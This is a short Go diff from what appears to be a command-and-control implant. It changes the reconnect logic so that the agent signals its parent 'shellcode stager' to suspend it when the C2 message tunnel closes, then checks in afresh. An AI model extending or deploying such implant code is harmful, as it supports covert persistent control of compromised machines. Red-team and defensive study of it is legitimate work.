@@ -232,7 +232,11 @@ connect:
 	}
 	logging.Println("Connecting to message tunnel...")
 	c2transport.MsgTunneler(def.CCMsgConn, common.RuntimeConfig, handler.HandleC2Command, ctx, cancel)
-	logging.Printf("Message tunnel closed, reconnecting")
+	logging.Printf("Message tunnel closed, signaling parent and sleeping")
+	// Signal parent (shellcode stager) to suspend us immediately
+	// This prevents attempting reconnection that gets interrupted mid-preflight
+	conditionalC2FailNotify()
+	// When resumed, reconnect with fresh state
 	isCheckedIn = false // reset check-in status so we do a fresh check-in
 	goto connect
 }
